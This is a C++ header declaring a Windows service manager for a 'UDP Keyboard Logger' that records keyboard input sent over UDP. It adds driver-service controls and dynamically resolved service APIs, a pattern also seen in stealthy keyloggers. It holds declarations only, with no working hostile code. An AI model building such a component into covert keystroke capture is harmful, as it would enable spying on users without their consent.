#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <Windows.h>
#include <string>

namespace ServiceConstants {
    constexpr const wchar_t* SERVICE_NAME = L"UdpKeyboardLogger";
    constexpr const wchar_t* SERVICE_DISPLAY_NAME = L"UDP Keyboard Logger Service";
    constexpr const wchar_t* SERVICE_DESCRIPTION = L"Logs keyboard input received via UDP protocol to file with daily rotation";
}

class UdpServiceManager {
public:
    // Service installation/management
    static bool InstallService(const std::wstring& exePath) noexcept;
    static bool UninstallService() noexcept;
    static bool StartServiceProcess() noexcept;
    static bool StopServiceProcess() noexcept;
    static int RunAsService() noexcept;
    
    // Service status queries
    static bool IsServiceInstalled() noexcept;
    static bool IsServiceRunning() noexcept;

    // ADD THESE NEW METHODS FOR DRIVER MANAGEMENT:
    static bool StartDriverService() noexcept;
    static bool StopDriverService() noexcept;
    static bool RestartDriverService() noexcept;
    static bool IsDriverServiceRunning() noexcept;

private:
    // Service entry points
    static VOID WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
    static VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode);
    static DWORD WINAPI ServiceWorkerThread(LPVOID param);
    
    // Service helpers
    static bool SetServiceStatus(DWORD currentState, DWORD exitCode = NO_ERROR, DWORD waitHint = 0) noexcept;
    static bool InitializeServiceComponents() noexcept;
    static void ServiceCleanup() noexcept;
    static bool InitDynamicAPIs() noexcept;
    
    // Service state
    static SERVICE_STATUS_HANDLE s_serviceStatusHandle;
    static SERVICE_STATUS s_serviceStatus;
    static HANDLE s_serviceStopEvent;
    static volatile bool s_serviceRunning;
    
    // Dynamic API pointers
    static decltype(&::OpenServiceW) g_pOpenServiceW;
    static decltype(&::CreateServiceW) g_pCreateServiceW;
    static decltype(&::DeleteService) g_pDeleteService;
    static decltype(&::StartServiceW) g_pStartServiceW;
    static decltype(&::ControlService) g_pControlService;
    static decltype(&::QueryServiceStatus) g_pQueryServiceStatus;
};